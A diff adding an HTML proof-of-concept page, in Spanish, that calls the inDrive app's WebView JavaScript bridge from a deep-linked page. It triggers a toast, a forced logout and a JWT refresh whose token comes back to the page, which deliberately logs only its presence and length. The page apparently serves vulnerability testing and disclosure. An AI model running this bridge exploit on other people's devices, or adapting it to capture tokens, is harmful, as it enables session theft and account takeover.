@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>inDrive WebView Bridge PoC</title>
+<style>
+  body { font-family: monospace; background:#111; color:#0f0; padding:16px; }
+  button { display:block; width:100%; padding:14px; margin:8px 0; font-size:16px; }
+  #log { background:#000; padding:8px; margin-top:16px; white-space:pre-wrap; word-break:break-all; border:1px solid #0f0; min-height:120px; }
+  .stage1 { background:#264; }
+  .stage2 { background:#642; }
+  .stage3 { background:#822; }
+</style>
+</head>
+<body>
+<h3>inDrive WebView Bridge - PoC (solo pruebas propias)</h3>
+<p>Esta página se carga dentro del WebView de inDrive vía un deep link. Los botones llaman directo al puente nativo <code>Android.postMessage(...)</code>. Nada se manda a ningún servidor externo - todo queda en pantalla, en tu propio teléfono.</p>
+
+<button class="stage1" onclick="testToast()">1. TOAST (inofensivo, sin efectos secundarios)</button>
+<button class="stage2" onclick="testLogout()">2. LOGOUT forzado (te desloguea, reversible)</button>
+<button class="stage3" onclick="testRefreshJwt()">3. REFRESH_JWT (sensible - lee el resultado abajo, NO lo compartas)</button>
+
+<div id="log">Esperando...\n</div>
+
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + "\n";
+}
+
+// Recibe los callbacks nativos -> JS (evaluateJavascript llama a esta función global)
+window.callWebView = function(payload) {
+  try {
+    if (typeof payload === "string") payload = JSON.parse(payload);
+  } catch (e) {}
+  var action = payload && payload.action;
+  var success = payload && payload.success;
+
+  if (action === "refresh_jwt") {
+    var tokenPresent = !!(payload.payload && payload.payload.data);
+    var tokenLen = tokenPresent ? String(payload.payload.data).length : 0;
+    log("[callWebView] action=refresh_jwt success=" + success + " token_recibido=" + tokenPresent + " longitud=" + tokenLen);
+    log("*** NO copies ni compartas el valor real del token. Solo importa si tokenPresent=true. ***");
+    return;
+  }
+  log("[callWebView] " + JSON.stringify(payload));
+};
+
+function send(action, data) {
+  var msg = JSON.stringify({ action: action, data: data || {} });
+  log("-> enviando: " + msg);
+  if (window.Android && window.Android.postMessage) {
+    window.Android.postMessage(msg);
+  } else {
+    log("ERROR: window.Android no existe - esta página no está cargada dentro del WebView de inDrive.");
+  }
+}
+
+function testToast() {
+  send("toast", { text: "PoC bridge test - " + new Date().toISOString() });
+}
+
+function testLogout() {
+  send("logout_with_message", { message: "PoC de seguridad - deslogueo de prueba" });
+}
+
+function testRefreshJwt() {
+  send("refresh_jwt", { old_jwt: "poc-test-value-not-a-real-token" });
+}
+
+log("Página cargada. Host: " + location.href);
+log("window.Android disponible: " + !!(window.Android));
+</script>
+</body>
+</html>
